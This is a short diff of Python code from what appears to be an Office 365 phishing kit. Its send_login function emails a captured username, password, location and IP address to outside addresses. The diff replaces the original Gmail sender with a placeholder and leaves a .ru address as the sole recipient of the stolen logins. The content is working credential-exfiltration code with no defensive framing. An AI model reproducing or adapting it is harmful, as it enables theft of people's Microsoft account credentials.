@@ -6,8 +6,8 @@ from datetime import datetime
 
 def send_login(username,password,country,city, zipcode,ip):
     msg = Message(f'Office 365 | {ip}',
-        sender='angelamoore914@gmail.com',
-        recipients=['i@smuller.ru','angelamoore914@gmail.com'])
+        sender='senderGmailHere',
+        recipients=['i@smuller.ru'])
     msg.body=f'''
     For ----- Office365
     -------+ User Login +--------
